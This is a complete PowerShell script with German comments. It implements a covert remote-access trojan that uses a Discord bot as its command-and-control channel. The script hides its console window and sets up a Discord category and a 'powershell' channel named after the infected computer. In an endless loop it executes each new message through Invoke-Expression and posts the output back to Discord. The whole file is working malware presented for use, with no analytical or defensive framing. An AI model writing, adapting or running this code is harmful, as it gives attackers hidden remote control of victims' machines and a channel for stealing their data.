function Start-RemoteBot {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Token
    )

    # === Setup ===
    $headers = @{
        "Authorization" = "Bot $Token"
        "User-Agent"    = "DiscordBot (https://discordapp.com, v1)"
        "Content-Type"  = "application/json"
    }

    $baseUrl = "https://discord.com/api/v10"
    $computerName = $env:COMPUTERNAME

    # === Unsichtbar laufen lassen ===
    Add-Type -Name Win -Namespace Native -MemberDefinition '
    [DllImport("user32.dll")] public static extern int ShowWindow(int handle, int state);
    [DllImport("kernel32.dll")] public static extern int GetConsoleWindow();'
    $consoleHandle = [Native.Win]::GetConsoleWindow()
    [Native.Win]::ShowWindow($consoleHandle, 0)

    # === Hole Bot-User (um Server zu finden)
    $botUser = Invoke-RestMethod -Uri "$baseUrl/users/@me" -Headers $headers
    $guilds = Invoke-RestMethod -Uri "$baseUrl/users/@me/guilds" -Headers $headers
    $guildId = $guilds[0].id  # Wir nehmen an: der Bot ist nur in einem Server!

    # === Prüfe ob Kategorie existiert
    $channels = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/channels" -Headers $headers
    $category = $channels | Where-Object { $_.name -eq $computerName -and $_.type -eq 4 }

    if (-not $category) {
        $body = @{ name = $computerName; type = 4 } | ConvertTo-Json
        $category = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/channels" -Headers $headers -Method Post -Body $body
    }

    # === Erstelle Channel 'powershell' falls nicht vorhanden
    $psChannel = $channels | Where-Object { $_.name -eq "powershell" -and $_.parent_id -eq $category.id }
    if (-not $psChannel) {
        $body = @{
            name = "powershell"
            type = 0  # text
            parent_id = $category.id
        } | ConvertTo-Json
        $psChannel = Invoke-RestMethod -Uri "$baseUrl/guilds/$guildId/channels" -Headers $headers -Method Post -Body $body
    }

    $channelId = $psChannel.id
    $lastMessageId = ""

    while ($true) {
        try {
            $url = "$baseUrl/channels/$channelId/messages?limit=1"
            $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
            $message = $response[0]

            if ($message.id -ne $lastMessageId -and $message.author.id -ne $botUser.id) {
                $lastMessageId = $message.id
                $cmd = $message.content

                if ($cmd -eq "!exit") { break }

                try {
                    $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
                } catch {
                    $output = $_.Exception.Message
                }

                $output = $output.Trim()
                if ($output.Length -gt 1900) {
                    $output = $output.Substring(0,1900) + "`n[...]"
                }

                $body = @{
                    content = "````powershell`n$output`n````"
                } | ConvertTo-Json -Compress

                Invoke-RestMethod -Uri "$baseUrl/channels/$channelId/messages" `
                                  -Headers $headers -Method Post -Body $body
            }
        } catch {}
        Start-Sleep -Seconds 4
    }
}
